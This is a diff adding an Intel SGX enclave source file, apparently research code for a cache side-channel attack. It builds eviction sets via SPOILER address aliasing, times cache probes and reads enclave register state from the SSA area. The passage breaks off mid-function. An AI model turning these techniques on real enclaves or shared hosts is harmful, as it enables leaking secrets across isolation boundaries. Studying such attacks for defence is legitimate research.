@@ -1,0 +1,2194 @@
+/*
+ * Copyright (C) 2011-2020 Intel Corporation. All rights reserved.
+ *
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions
+ * are met:
+ *
+ *   * Redistributions of source code must retain the above copyright
+ *     notice, this list of conditions and the following disclaimer.
+ *   * Redistributions in binary form must reproduce the above copyright
+ *     notice, this list of conditions and the following disclaimer in
+ *     the documentation and/or other materials provided with the
+ *     distribution.
+ *   * Neither the name of Intel Corporation nor the names of its
+ *     contributors may be used to endorse or promote products derived
+ *     from this software without specific prior written permission.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
+ * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
+ * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
+ * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
+ * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
+ * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
+ * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
+ * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
+ * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
+ * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+ * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ *
+ */
+
+#include "Enclave.h"
+#include "Enclave_t.h" /* print_string */
+
+#include "ThreadLibrary/ThreadTest.h"
+#include "arch.h"
+
+#include <stdarg.h>
+#include <stdio.h> /* vsnprintf */
+#include <string.h>
+
+#define DEBUG 0
+#define DEBUG_CACHE 0
+#define REPS 30
+#define OFFSET 27
+#define TIME_FLUSH 270
+#define MARGIN 180
+#define INTERLEAVED 1
+#define FULL_SET 0
+#define LINE_OFF 8
+#define ATTACK 1
+#define CONTINUOS 0
+
+typedef uint64_t sys_word_t;
+typedef struct _thread_data_t
+{
+    sys_word_t self_addr;
+    sys_word_t last_sp;          /* set by urts, relative to TCS */
+    sys_word_t stack_base_addr;  /* set by urts, relative to TCS */
+    sys_word_t stack_limit_addr; /* set by urts, relative to TCS */
+    sys_word_t first_ssa_gpr;    /* set by urts, relative to TCS */
+    sys_word_t stack_guard;      /* GCC expects start_guard at 0x14 on x86 and 0x28 on x64 */
+
+    sys_word_t flags;
+    sys_word_t xsave_size; /* in bytes (se_ptrace.c needs to know its offset).*/
+    sys_word_t last_error; /* init to be 0. Used by trts. */
+
+#ifdef TD_SUPPORT_MULTI_PLATFORM
+    sys_word_t m_next; /* next TD used by trusted thread library (of type "struct _thread_data *") */
+#else
+    struct _thread_data_t *m_next;
+#endif
+    sys_word_t tls_addr;  /* points to TLS pages */
+    sys_word_t tls_array; /* points to TD.tls_addr relative to TCS */
+#ifdef TD_SUPPORT_MULTI_PLATFORM
+    sys_word_t exception_flag; /* mark how many exceptions are being handled */
+#else
+    intptr_t exception_flag;
+#endif
+    sys_word_t cxx_thread_info[6];
+    sys_word_t stack_commit_addr;
+} thread_data_t;
+
+#ifdef __cplusplus
+extern "C"
+{
+#endif
+
+    thread_data_t *get_thread_data(void);
+
+#ifdef __cplusplus
+}
+#endif
+
+pthread_t counter_task;
+pthread_t monitor_task;
+uint32_t data_size;
+uint8_t sealed_data;
+long int timeini;
+
+thread_data_t *thread_data;
+ssa_gpr_t *ssa_gpr = NULL;
+
+size_t *regs;
+char *stack;
+size_t samples_rip[MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES * SAMPLES_SIZE];
+//int samples_exit[MONITORED_SETS * WAYS_FILLED * CACHE_SLICES * SAMPLES_SIZE];
+//long int samples_time[MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES * SAMPLES_SIZE];
+long int measurements[PAGE_COUNT];
+long int array_addresses[SPOILER_SETS][SPOILER_PEAKS];
+long int set_addresses[SPOILER_SETS * SPOILER_PEAKS];
+long int final_eviction_set[MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES];
+long int eviction_add[MONITORED_SETS * CACHE_SLICES];
+long int eviction_add_1[CACHE_SLICES];
+int mon_ways;
+
+/* 
+ * printf: 
+ *   Invokes OCALL to display the enclave buffer to the terminal.
+ */
+int printf(const char *fmt, ...)
+{
+    char buf[BUFSIZ] = {'\0'};
+    va_list ap;
+    va_start(ap, fmt);
+    vsnprintf(buf, BUFSIZ, fmt, ap);
+    va_end(ap);
+    ocall_print_string(buf);
+    return (int)strnlen(buf, BUFSIZ - 1) + 1;
+}
+
+/* 
+ * printf: 
+ *   Invokes OCALL to display the enclave buffer with a timestamp.
+ */
+int printimf(const char *fmt, ...)
+{
+    char buf[BUFSIZ] = {'\0'};
+    va_list ap;
+    va_start(ap, fmt);
+    vsnprintf(buf, BUFSIZ, fmt, ap);
+    va_end(ap);
+    ocall_print_timed_string(buf);
+    return (int)strnlen(buf, BUFSIZ - 1) + 1;
+}
+
+/* 
+ * printf: 
+ *   Invokes OCALL to display the enclave buffer with a timestamp.
+ */
+int printFile(const char *fmt, ...)
+{
+    char buf[BUFSIZ] = {'\0'};
+    va_list ap;
+    va_start(ap, fmt);
+    vsnprintf(buf, BUFSIZ, fmt, ap);
+    va_end(ap);
+    ocall_write_plain_string(buf);
+    return (int)strnlen(buf, BUFSIZ - 1) + 1;
+}
+
+/*
+    ECALL function to parse input
+*/
+sgx_status_t get_data_ready(const uint8_t *sealed_in, size_t data_size_in)
+{
+    if (sealed_in == NULL)
+    {
+        return SGX_ERROR_INVALID_PARAMETER;
+    }
+    if (data_size_in == 0)
+    {
+        if (assign_secret(&sealed_data, &data_size) == 0)
+        {
+            printf("Data size %u \n", data_size);
+            ocall_save_sealed_data(&sealed_data, data_size);
+        }
+        printf("Hello World ready %i \n", (int8_t)secret_data[0]);
+        printf("Counter %li \n", global_counter);
+        return SGX_SUCCESS;
+    }
+    //Retrieve the sealeed data
+    sgx_status_t ret = unseal_data(sealed_in, data_size_in);
+    printf("Hello World retrieved %i %i %i\n", (uint32_t)secret_data[0], (int8_t)secret_data[0], ret);
+    return ret;
+}
+
+int get_eax(void)
+{
+    //printf("");
+    int i = 0;
+    size_t exitreason = regs[17];
+    //regs[17]= 0xFF;
+    if ((exitreason != 0) || (regs[20] != 0))
+    {
+        thread_data = get_thread_data();
+        regs = (size_t *)(thread_data->first_ssa_gpr);
+        if (DEBUG)
+        {
+            printf("exit %zx %zx\n", regs[20], regs[17]);
+        }
+        regs[20] = 0;
+        regs[17] = 0;
+        i = 1;
+    }
+    return i;
+}
+
+size_t get_rip(void)
+{
+    thread_data = get_thread_data();
+    ssa_gpr = reinterpret_cast<ssa_gpr_t *>(thread_data->first_ssa_gpr);
+    //printf("EXIT %i",ssa_gpr->exit_info);
+    regs = (size_t *)(thread_data->first_ssa_gpr);
+    return regs[17];
+}
+
+void build_ev_set(int offset, long int ev_set[MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES], long int ev_set_1[CACHE_SET_SIZE * CACHE_SLICES], long int f_ev_set[MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES], int mways)
+{
+    long int original_address; // = (long int)&(memory_map[ram_border]) + ((slice << 6) & 0x0000FFC0);
+    int i, j, k;
+    long int pos2;
+    for (i = 0; i < MONITORED_SETS * CACHE_SLICES; i++)
+    {
+        original_address = eviction_add[i];
+        eviction_add[i] = original_address;
+    }
+    //Save the final set
+    for (i = 0; i < MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES; i++)
+    {
+
+        original_address = ev_set[i];
+        f_ev_set[i] = original_address;
+        //original_address = ev_set_1[i];
+        //f_ev_set[2 * i + 1] = ((original_address) & (0xFFFFFFFFFFFFF000)) + ((offset << 6) & (0x00000FC0));
+    }
+
+    for (i = 0; i < MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES; i++)
+    {
+        printf("EVV %lx %i\n", f_ev_set[i], i);
+    }
+    /*Write this data in sets*/
+    if (FULL_SET)
+    {
+
+        if (!INTERLEAVED)
+        {
+            //It needs to start with the address of each set
+            for (i = 0; i < MONITORED_SETS; i++)
+            {
+                for (k = 0; k < CACHE_SLICES; k++)
+                {
+                    for (j = 0; j < mways; j++)
+                    {
+                        long int *pos1 = (long int *)f_ev_set[i * CACHE_SLICES * CACHE_SET_SIZE + k * CACHE_SET_SIZE + j];
+                        if (j == (mways - 1))
+                        {
+                            pos2 = f_ev_set[(i * CACHE_SLICES * CACHE_SET_SIZE + k * CACHE_SET_SIZE) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES)];
+                        }
+                        else
+                        {
+                            pos2 = f_ev_set[(i * CACHE_SLICES * CACHE_SET_SIZE + k * CACHE_SET_SIZE + j + 1) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES)];
+                        }
+                        *pos1 = pos2;
+                    }
+                }
+            }
+        }
+        else
+        {
+            for (j = 0; j < mways; j++)
+            {
+                for (k = 0; k < CACHE_SLICES; k++)
+                {
+                    for (i = 0; i < MONITORED_SETS; i++)
+                    {
+                        long int *pos1 = (long int *)f_ev_set[i * CACHE_SLICES * CACHE_SET_SIZE + k * CACHE_SET_SIZE + j];
+                        if (i == (MONITORED_SETS - 1))
+                        {
+                            pos2 = f_ev_set[(k * CACHE_SET_SIZE + j) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES)];
+                        }
+                        else
+                        {
+                            pos2 = f_ev_set[((i + 1) * CACHE_SLICES * CACHE_SET_SIZE + k * CACHE_SET_SIZE + j) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES)];
+                        }
+                        *pos1 = pos2;
+                    }
+                }
+            }
+        }
+        /*         for (i = 0; i < 2 * CACHE_SLICES; i++)
+        {
+            for (j = 0; j < WAYS_FILLED; j++)
+            {
+                long int *pos1 = (long int *)f_ev_set[i * CACHE_SET_SIZE + j];
+                printf("%lx %i ", (*pos1), i * WAYS_FILLED + j);
+                pos1 = (long int *)(*pos1);
+                //printf("EVV2 %i \n",i);
+            }
+        }
+        printf("\n"); */
+    }
+    else
+    {
+        if (!INTERLEAVED)
+        {
+            for (i = 0; i < MONITORED_SETS; i++)
+            {
+                for (k = 0; k < CACHE_SLICES; k++)
+                {
+                    for (j = 0; j < mways; j++)
+                    {
+                        long int *pos1 = (long int *)f_ev_set[i * CACHE_SLICES * CACHE_SET_SIZE + k * CACHE_SET_SIZE + j];
+                        if (j == (mways - 1))
+                        {
+                            if (k == (CACHE_SLICES - 1))
+                            {
+                                if (i == (MONITORED_SETS - 1))
+                                {
+                                    pos2 = f_ev_set[0];
+                                }
+                                else
+                                {
+                                    pos2 = f_ev_set[((i + 1) * CACHE_SLICES * CACHE_SET_SIZE) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES)];
+                                }
+                            }
+                            else
+                            {
+                                pos2 = f_ev_set[((i)*CACHE_SLICES * CACHE_SET_SIZE + (k + 1) * CACHE_SET_SIZE) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES)];
+                            }
+                        }
+                        else
+                        {
+                            pos2 = f_ev_set[((i)*CACHE_SLICES * CACHE_SET_SIZE + k * CACHE_SET_SIZE + j + 1) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES)];
+                        }
+                        *pos1 = pos2;
+                    }
+                }
+            }
+            /* for (i = 0; i < MONITORED_SETS * CACHE_SLICES; i++)
+            {
+                for (j = 0; j < WAYS_FILLED; j++)
+                {
+                    long int *pos1 = (long int *)f_ev_set[i * CACHE_SET_SIZE + j];
+                    if (j == (WAYS_FILLED - 1))
+                    {
+                        pos2 = f_ev_set[((i + 1) * CACHE_SET_SIZE) % (2 * CACHE_SET_SIZE * CACHE_SLICES)];
+                    }
+                    else
+                    {
+                        pos2 = f_ev_set[(i * CACHE_SET_SIZE + j + 1) % (2 * CACHE_SET_SIZE * CACHE_SLICES)];
+                    }
+                    //long int *pos1 = (long int *)f_ev_set[i * CACHE_SET_SIZE + j];
+                    //long int pos2 = f_ev_set[(i + 1) % (CACHE_SET_SIZE * CACHE_SLICES)];
+                    *pos1 = pos2;
+                    //printf("EVV2 %lx %i\n", (*pos1), i);
+                }
+            } */
+        }
+        else
+        {
+            for (j = 0; j < mways; j++)
+            {
+                for (k = 0; k < CACHE_SLICES; k++)
+                {
+                    for (i = 0; i < MONITORED_SETS; i++)
+                    {
+                        //printf("Index 1: %d ", i * CACHE_SLICES * CACHE_SET_SIZE + k * CACHE_SET_SIZE + j);
+                        long int *pos1 = (long int *)f_ev_set[i * CACHE_SLICES * CACHE_SET_SIZE + k * CACHE_SET_SIZE + j];
+                        if (i == (MONITORED_SETS - 1))
+                        {
+                            if (k == (CACHE_SLICES - 1))
+                            {
+                                if (j == (mways - 1))
+                                {
+                                    pos2 = f_ev_set[0];
+                                    //printf("Index 2: %d ", 0);
+                                }
+                                else
+                                {
+                                    pos2 = f_ev_set[(j + 1) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES)];
+                                    //printf("Index 2: %d ", (j + 1) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES));
+                                }
+                            }
+                            else
+                            {
+                                pos2 = f_ev_set[((k + 1) * CACHE_SET_SIZE + j) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES)];
+                                //printf("Index 2: %d ", ((k + 1) * CACHE_SET_SIZE + j) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES));
+                            }
+                        }
+                        else
+                        {
+                            pos2 = f_ev_set[((i + 1) * CACHE_SLICES * CACHE_SET_SIZE + k * CACHE_SET_SIZE + j) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES)];
+                            //printf("Index 2: %d ", ((i + 1) * CACHE_SLICES * CACHE_SET_SIZE + k * CACHE_SET_SIZE + j) % (MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES));
+                        }
+                        *pos1 = pos2;
+                    }
+                }
+            }
+        }
+        long unsigned int *pos1 = (long unsigned int *)f_ev_set[0];
+        long unsigned int begin = f_ev_set[0];
+        i = 0;
+        do
+        {
+            printf("%lx %i ", (*pos1), i);
+            pos1 = (long unsigned int *)(*pos1);
+            i++;
+        } while (pos1 != (long unsigned int *)begin);
+        printf("\n");
+    }
+}
+
+/*
+ * TLB function
+ */
+
+void gen_tlb(void)
+{
+    printf("val %lx \n", eviction_set_tlb[0]);
+    build_tlb_eviction(EV_SET_SIZE, eviction_set_tlb);
+    int i;
+    for (i = 0; i < EV_SET_SIZE; i++)
+    {
+        printf("%lx %i %li \n", eviction_set_tlb[i], addr2slice_linear((unsigned long)eviction_set_tlb[i], 128), ((eviction_set_tlb[i]) >> PAGE_BITS) & 0x0000000F);
+    }
+    printf("%lx \n", (long unsigned int)&memory_map_tlb[RESERVED_MEMORY_TLB - 1]);
+    //Write the linked list
+
+    for (i = 0; i < EV_SET_SIZE; ++i)
+    {
+        long int *dir_mem = (long int *)eviction_set_tlb[i];
+        long int dir_sig = eviction_set_tlb[(i + 1) % (EV_SET_SIZE)];
+        *(dir_mem) = dir_sig;
+    }
+}
+
+/*int build_array(int border, int init, int off, int spoiler_trials)
+{
+    int res = 1;
+    int ensure256[2 * SPOILER_SETS];
+    int i, ind = 0, j, k, samps, cont = 0, c, l = 0;
+    for (j = 0; j < 2 * SPOILER_SETS; j++)
+    {
+        ensure256[j] = border + j;
+    }
+    //while (cont < SPOILER_SETS)
+    //{
+    for (j = border; j < (border + SPOILER_SETS); j++)
+    {
+        while ((ensure256[ind]) == (-1))
+        {
+            printf("Err %i %i %i\n", j,j-border, ind);
+            ind++;
+            if (ind > 2 * SPOILER_SETS)
+            {
+                return -1;
+            }
+        }
+        //j = ensure256[ind];
+        long int s_set[PAGE_COUNT] = {0};
+        for (k = 1; k <= spoiler_trials; k++)
+        {
+            address_aliasing(WINDOW_SIZE, j, init + off, measurements);
+            samps = peak_search(s_set, measurements);
+            //printf("Samps %i \n",samps);
+        }
+        c = 0;
+        for (i = 0; i < PAGE_COUNT; i++)
+        {
+            if (s_set[i] > 0.3 * spoiler_trials)
+            {
+                array_addresses[l][c] = (long int)(&memory_map[i * PAGE_SIZE + init + off]);
+                if (((i - border) >= 0) && ((i - border) < 2 * SPOILER_SETS))
+                {
+                    printf("Bord %i %li %i \n", i, s_set[i], j - border);
+                    ensure256[(i - border)] = -1;
+                }
+                if (1)
+                //if ((j == border) || (j == (border + 1)))
+                {
+                    printf("Peak %i %li %i %li\n", i, s_set[i], j - border, measurements[i]);
+                }
+                c++;
+                if (c >= SPOILER_PEAKS)
+                {
+                    break;
+                }
+            }
+        }
+        if (c < (10))
+        {
+            j--;
+            l--;
+            spoiler_trials += 50;
+            res++;
+            if (res > 20)
+            {
+                return 0;
+            }
+        }
+        else
+        {
+            spoiler_trials = 100;
+        }
+        l++;
+        //printf("Peak %i %i\n", j - border, c);
+        printf("Peak %i %i %i\n", cont, ind, c);
+        cont++;
+        ind++;
+    }
+    return res;
+}*/
+
+int build_array(int border, int init, int off, int spoiler_trials)
+{
+    int res = 1;
+    int trials = spoiler_trials;
+    int i, j, k, samps, c, l = 0;
+    int expected_size = 28;
+    for (j = border; j < (border + SPOILER_SETS); j++)
+    {
+        trials = spoiler_trials;
+        long int s_set[PAGE_COUNT] = {0};
+        for (k = 1; k <= spoiler_trials; k++)
+        {
+            address_aliasing(WINDOW_SIZE, j, init + off, measurements);
+            samps = peak_search(s_set, measurements);
+            //printf("Samps %i \n",samps);
+        }
+        c = 0;
+        for (i = 0; i < PAGE_COUNT; i++)
+        {
+            if (s_set[i] > 0.3 * spoiler_trials)
+            {
+                array_addresses[l][c] = (long int)(&memory_map[i * PAGE_SIZE + init + off]);
+                //if (j == border)
+                if (1)
+                {
+                    printf("Peak %i %li %i %li\n", i, s_set[i], j - border, measurements[i]);
+                }
+                c++;
+                if (c >= SPOILER_PEAKS)
+                {
+                    break;
+                }
+            }
+        }
+        if (c < (expected_size))
+        {
+            j--;
+            l--;
+            trials += 10;
+            res++;
+            if (res > 2)
+            {
+		if (l>18){
+                    expected_size--;
+                    res = 1;
+		}
+            }
+            if (expected_size < 3)
+            {
+                return 0;
+            }
+        }
+        else
+        {
+            trials = spoiler_trials;
+        }
+        l++;
+        printf("Peak %i %i %i\n", j - border, c, samps);
+    }
+    return res;
+}
+
+void filter_spoiler(int reduced_set[SPOILER_SETS], int pre_set[SPOILER_SETS], long int ev_set[CACHE_SET_SIZE * CACHE_SLICES])
+{
+    int l, c, rep, cont1;
+    for (l = 0; l < SPOILER_SETS; l++)
+    {
+        reduced_set[l] = pre_set[l];
+    }
+
+    long int set_add[SPOILER_PEAKS];
+    long int t_add;
+    int cont2, s, tmes;
+    for (l = 0; l < SPOILER_SETS; l++)
+    {
+        //Check for the reduction
+        if (reduced_set[l] >= 0)
+        {
+            cont1 = 0;
+            for (c = 0; c < SPOILER_PEAKS; c++)
+            {
+                if (array_addresses[l][c] > 0)
+                {
+                    //printf("Ad %lx %i\n", array_addresses[l][c], cont);
+                    set_add[cont1] = (array_addresses[l][c]);
+                    cont1++;
+                }
+            }
+            //Check if the addresses are evicted by the
+            cont2 = 0;
+            for (c = 0; c < cont1; c++)
+            {
+                t_add = set_add[c];
+                s = 0;
+                if (check_inside(t_add, ev_set, CACHE_SET_SIZE * CACHE_SLICES))
+                {
+                    cont2 = cont1;
+                    break;
+                }
+                else
+                {
+                    for (rep = 0; rep < 100; rep++)
+                    {
+                        flush_data((long int *)t_add);
+                        flush_desired_set(ev_set, CACHE_SET_SIZE * CACHE_SLICES);
+                        lfence();
+                        tmes = probe_candidate_sorted(CACHE_SET_SIZE * CACHE_SLICES, ev_set, (long int *)t_add);
+                        if (tmes > TIME_FLUSH)
+                        {
+                            s++;
+                        }
+                    }
+                    if (s > 70)
+                    {
+                        cont2++;
+                    }
+                }
+            }
+            double ratio = (100.0 * cont2) / (double)cont1;
+            if (ratio > 70)
+            {
+                reduced_set[l] = -1;
+                printf("Removed %d %f\n", l, ratio);
+            }
+        }
+    }
+
+    //Now copy the result
+    for (l = 0; l < SPOILER_SETS; l++)
+    {
+        pre_set[l] = reduced_set[l];
+    }
+}
+
+void spoiler_cache(int reduced_set[SPOILER_SETS], int pre_set[SPOILER_SETS], long int ev_set[SPOILER_SETS * SPOILER_PEAKS], int counter)
+{
+    int l, c, rep, cont1;
+    for (l = 0; l < SPOILER_SETS; l++)
+    {
+        reduced_set[l] = -1;
+    }
+
+    long int set_add[SPOILER_PEAKS];
+    long int t_add;
+    int cont2, s, tmes;
+    for (l = 0; l < SPOILER_SETS; l++)
+    {
+        //Check for the reduction
+        if (pre_set[l] >= 0)
+        {
+            cont1 = 0;
+            for (c = 0; c < SPOILER_PEAKS; c++)
+            {
+                if (array_addresses[l][c] > 0)
+                {
+                    //printf("Ad %lx %i\n", array_addresses[l][c], cont);
+                    set_add[cont1] = (array_addresses[l][c]);
+                    cont1++;
+                }
+            }
+            //Check if the addresses are evicted by the
+            cont2 = 0;
+            for (c = 0; c < cont1; c++)
+            {
+                t_add = set_add[c];
+                s = 0;
+                if (check_inside(t_add, ev_set, counter))
+                {
+                    cont2 = cont1;
+                    break;
+                }
+                else
+                {
+                    for (rep = 0; rep < 100; rep++)
+                    {
+                        flush_data((long int *)t_add);
+                        flush_desired_set(ev_set, counter);
+                        lfence();
+                        tmes = probe_candidate_sorted(counter, ev_set, (long int *)t_add);
+                        if (tmes > TIME_FLUSH)
+                        {
+                            s++;
+                        }
+                    }
+                    if (s > 70)
+                    {
+                        cont2++;
+                    }
+                }
+            }
+            double ratio = (100.0 * cont2) / (double)cont1;
+            printf("Ratio %f\n", ratio);
+            if (ratio > 40)
+            {
+                reduced_set[l] = l;
+                printf("Included %d %f\n", l, ratio);
+            }
+        }
+    }
+
+    //Now copy the result
+}
+
+void get_reduced_set(int reduced_set[SPOILER_SETS], int pre_set[SPOILER_SETS], long int test_address, int r, int position, int startk)
+{
+    int cont1 = 0, c2;
+    int tmes = 0;
+    int k, l, c, v = 0;
+    int rem_sets = 0;
+    int stuck = 0, last_red;
+    int loops = 0;
+    int avail = CACHE_SET_SIZE * CACHE_SLICES * MONITORED_SETS;
+    int last_avail = CACHE_SET_SIZE * CACHE_SLICES * MONITORED_SETS;
+    k = startk;
+    for (l = 0; l < SPOILER_SETS; l++)
+    {
+        reduced_set[l] = pre_set[l];
+        if (reduced_set[l] >= 0)
+        {
+            rem_sets++;
+        }
+    }
+    ///Now reduce the sets
+    int num_sets = rem_sets;
+    last_red = rem_sets;
+    int range = 0;
+    int range1 = 0;
+    //while ((num_sets > r) && (avail > (CACHE_SET_SIZE * CACHE_SLICES + range)))
+    while (avail > (CACHE_SET_SIZE * CACHE_SLICES + range))
+    {
+        k++;
+        k = k % SPOILER_SETS;
+        if (k == (position))
+        {
+            k++;
+        }
+        while (reduced_set[k] == -1)
+        {
+            k++;
+            k = k % SPOILER_SETS;
+            if (k == (position))
+            {
+                k++;
+            }
+        }
+        if (k == startk)
+        {
+            loops++;
+            printf("Loops start %i %i\n", last_avail, avail);
+        }
+
+        if (loops > 2)
+        {
+            printf("Loops reset %i \n", last_avail);
+            loops = 0;
+            for (l = 0; l < SPOILER_SETS; l++)
+            {
+                reduced_set[l] = pre_set[l];
+            }
+            //reps++;
+            cont1 = 0;
+            num_sets = rem_sets;
+            stuck = 0;
+            last_red = num_sets;
+            last_avail = CACHE_SET_SIZE * CACHE_SLICES * MONITORED_SETS;
+            avail = CACHE_SET_SIZE * CACHE_SLICES * MONITORED_SETS;
+        }
+        //Check for stuck and repeat
+        if (last_red != num_sets)
+        {
+            stuck++;
+            if (stuck > SPOILER_SETS)
+            {
+                printf("Stuck %i num sets, cont %i ran %i %i \n",num_sets,cont1,range,range1);
+                for (l = 0; l < SPOILER_SETS; l++)
+                {
+                    reduced_set[l] = pre_set[l];
+                }
+                //reps++;
+                cont1 = 0;
+                num_sets = rem_sets;
+                stuck = 0;
+                range1 = 0;
+                last_avail = CACHE_SET_SIZE * CACHE_SLICES * MONITORED_SETS;
+                avail = CACHE_SET_SIZE * CACHE_SLICES * MONITORED_SETS;
+            }
+            last_red = num_sets;
+        }
+        else
+        {
+            stuck--;
+            if (stuck < 0)
+            {
+                stuck = 0;
+            }
+        }
+        v = 0;
+        reduced_set[k] = -1;
+        num_sets--;
+        last_red = num_sets;
+        cont1 = 0;
+        c2 = 0;
+        for (l = 0; l < SPOILER_SETS; l++)
+        {
+            //Check for the reduction
+            if (reduced_set[l] >= 0)
+            {
+                for (c = 0; c < SPOILER_PEAKS; c++)
+                {
+                    if ((array_addresses[l][c] > 0) && (array_addresses[l][c] != test_address))
+                    {
+                        //printf("Ad %lx %i\n", array_addresses[l][c], cont);
+                        set_addresses[cont1] = (array_addresses[l][c]);
+                        cont1++;
+                    }
+                }
+                c2++;
+            }
+        }
+        if (num_sets != c2)
+        {
+            printf("Num set error \n");
+        }
+        num_sets = c2;
+        for (l = 0; l < 100; l++)
+        {
+            flush_data((long int *)test_address);
+            flush_desired_set(set_addresses, cont1);
+            lfence();
+            tmes = probe_candidate_sorted(cont1, set_addresses, (long int *)test_address);
+            if (tmes > TIME_FLUSH)
+            {
+                v++;
+            }
+        }
+        //If it is not removed, then we should keep it
+        if (v < 90)
+        {
+            reduced_set[k] = k;
+            num_sets++;
+            if (stuck>1)
+            {
+                if (range1<2*SPOILER_PEAKS)
+                {
+                    range1++;
+                }
+            }
+            if (cont1 <= CACHE_SET_SIZE * CACHE_SLICES + range1)
+            {
+                printf("Values count %i %i %i %i\n", avail, last_avail, cont1,stuck);
+                if (last_avail >= CACHE_SET_SIZE * CACHE_SLICES)
+                {
+                    range = last_avail - CACHE_SET_SIZE * CACHE_SLICES + 1;
+                }
+                if (stuck>10)
+                {
+                    range = last_avail - CACHE_SET_SIZE * CACHE_SLICES - 2;
+                    //range1 = range;
+                }
+            }
+            avail = last_avail;
+            //last_red = num_sets;
+        }
+        else
+        {
+            last_avail = cont1;
+        }
+        if (DEBUG)
+        {
+            printf("Times %i %i %i %i %i %i \n", tmes, cont1, k, v, num_sets, stuck);
+        }
+    }
+
+    cont1 = 0;
+    for (l = 0; l < SPOILER_SETS; l++)
+    {
+        //Check for the reduction
+        if (reduced_set[l] >= 0)
+        {
+            for (c = 0; c < SPOILER_PEAKS; c++)
+            {
+                if ((array_addresses[l][c] > 0) && (array_addresses[l][c] != test_address))
+                {
+                    //printf("Ad %lx %i\n", array_addresses[l][c], cont);
+                    set_addresses[cont1] = (array_addresses[l][c]);
+                    cont1++;
+                }
+            }
+        }
+    }
+
+    spoiler_cache(reduced_set, pre_set, set_addresses, cont1);
+
+    //Maybe even refill
+    //Set addresses and cont
+
+    printf("Reduced set %i %i %i %i %i\n", num_sets, cont1, c2, position, avail);
+    for (l = 0; l < SPOILER_SETS; l++)
+    {
+        printf("%i ", reduced_set[l]);
+    }
+    printf("\n");
+}
+
+int test_selection(int reps, int reduced_set[SPOILER_SETS], int *lim, long int test_address)
+{
+    int tmes = 0;
+    int cont = 0;
+    int l, c, v = 0;
+    /// Repeat the same test to find the data for the whole ev_set
+    for (l = 0; l < SPOILER_SETS; l++)
+    {
+        if (reduced_set[l] >= 0)
+        {
+            for (c = 0; c < SPOILER_PEAKS; c++)
+            {
+                if ((array_addresses[l][c] > 0) && (array_addresses[l][c] != test_address))
+                {
+                    //printf("Ad %li %i\n", array_addresses[l][c], cont);
+                    set_addresses[cont] = (array_addresses[l][c]);
+                    cont++;
+                }
+            }
+        }
+    }
+    *lim = cont;
+
+    //Ensure the selected set evicts the target
+    v = 0;
+    for (l = 0; l < 1000; l++)
+    {
+        flush_data((long int *)test_address);
+        flush_desired_set(set_addresses, cont);
+        lfence();
+        tmes = probe_candidate_sorted(cont, set_addresses, (long int *)test_address);
+        if (tmes > TIME_FLUSH)
+        {
+            v++;
+        }
+    }
+    printf("The filtered set goes to %i \n", v);
+    return v;
+}
+
+int get_min_set(long int test_address, int cont, long int ev_set[CACHE_SET_SIZE * CACHE_SLICES], int index)
+{
+    int tmes = 0;
+    int k, l, v = 0;
+    int stuck = 0, last_red, reps;
+    int num_sets = SPOILER_SETS;
+    last_red = SPOILER_SETS;
+    reps = 0;
+    long int filtered_set[cont];
+    int cont1, conf;
+
+LAB:
+    //reps = 0;
+    cont1 = 1;
+    conf = 0;
+    randomize_set(set_addresses, cont);
+    v = 0;
+    while (conf < 10)
+    {
+        reps++;
+        //Get the test set
+        l = 0;
+        k = 0;
+        while (l < cont1)
+        //for (l = 0; l < cont1; l++)
+        {
+            if (!check_inside(set_addresses[k], ev_set, index * CACHE_SET_SIZE))
+            {
+                filtered_set[l] = set_addresses[k];
+                l++;
+            }
+            k++;
+        }
+        //Test it
+        for (l = 0; l < 1000; l++)
+        {
+            //flush_data((long int *)test_address);
+            //flush_desired_set(set_addresses, cont);
+            //lfence();
+            tmes = probe_candidate_flush(cont1, filtered_set, (long int *)test_address);
+            if (tmes > TIME_FLUSH)
+            {
+                v++;
+            }
+            //printf("%i ",tmes);
+        }
+        if (v > 900)
+        {
+            cont1--;
+            conf++;
+            //printf("Confidence pass %i %i\n", cont1, conf);
+        }
+        else
+        {
+            conf = 0;
+        }
+        cont1++;
+        if (cont1 > cont)
+        {
+            printf("Evicted %i\n", v);
+            reps++;
+            if (reps > 20)
+            {
+                return -1;
+            }
+            goto LAB;
+        }
+    }
+
+    printf("First pass %i %i\n", cont1, cont);
